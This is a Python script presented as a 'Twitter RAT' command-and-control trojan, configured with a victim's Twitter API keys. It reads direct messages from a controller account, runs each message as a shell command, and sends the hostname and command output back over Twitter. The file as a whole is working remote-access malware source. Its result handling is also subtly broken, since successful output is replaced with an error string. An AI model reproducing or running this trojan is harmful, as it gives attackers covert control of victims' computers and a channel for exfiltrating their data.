import os
import re
import time

import tweepy

## Complete API Parameters before use -- configured for victim user ##
consumer_key = ''
consumer_secret = ''
access_token = ''
access_token_secret = ''

## Complete info on user account ##
c2_usr = ''

# Twitter auth
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)
api = tweepy.API(auth)
userid = re.findall(r'(?<=u\'id\': )[0-9]+', str(api.get_user(c2_usr)))[0]

# Constant strings
CONNECTION_ESTABLISHED = "[+] Twitter RAT connection established...\n"
SOMETHING_WENT_WRONG = "[-] Something went wrong...\n"
COMMAND_RECIEVED = '[+] Command Recieved - '
COMMAND_FAILED = '[-] ERROR - COMMAND FAILED'
COMMAND_SENDING = '[+] Sending Result - \n'


def get_command(api, lastcommand):
    raw_dms = api.direct_messages()
    dms = re.findall(r'(?<=sender_id_str=u\'' + userid +
                     '\\\', text=u\')[^\']+', str(raw_dms))
    if dms[0] != lastcommand:
        return dms[0]
    return


def write_message(api, message):
    return api.send_direct_message(screen_name=c2_usr, text=message)


HOSTNAME = str(os.popen('hostname').read()).replace('\n', '')
SPLASH = '''
=====================================
==.................................==
==..........TWITTER RAT............==
==....COMMAND AND CONTROL TROJAN...==
==.................................==
=====================================

_____$$$$$s__________________________
_____$$$$$$$$s_______________________
___$$$$(O)$$$$$$_____________________
_$$$_$$$$$$$$$$______________________
_______$$$$$$$$$$s___________________
_________$$$$$$$$$$$s_____CONNECTION_
_________$$$$$$$$$$$$$$_____RECIEVED_
_________$$$$$$$$$$$$$$$$_____FROM:__
_________s$$$$$$$$$$$$$$$$$_____%s
___________$$$$$$$$$$$$$$$$$$________
_____________$$$$$$$$$$$$$$$$$$______
_________________$$$$$$$$$$$$$$$$____
_______________$$$$$______$$$$$$$$___
_________$$$$$$$$$____________$$$$$$_
''' % (HOSTNAME)

try:
    write_message(api, SPLASH)
    print(CONNECTION_ESTABLISHED)
except:
    print(SOMETHING_WENT_WRONG)
    exit(1)

last_command = get_command(api, None)

while True:
    command = get_command(api, last_command)
    if command:
        print(COMMAND_RECIEVED + command)
        time.sleep(2)
        last_command = command
        try:
            result = os.popen(command).read()
            if result:
                result = COMMAND_FAILED
        except:
            result = COMMAND_FAILED
        print(COMMAND_SENDING + result)
        write_message(api, result)
    time.sleep(1)
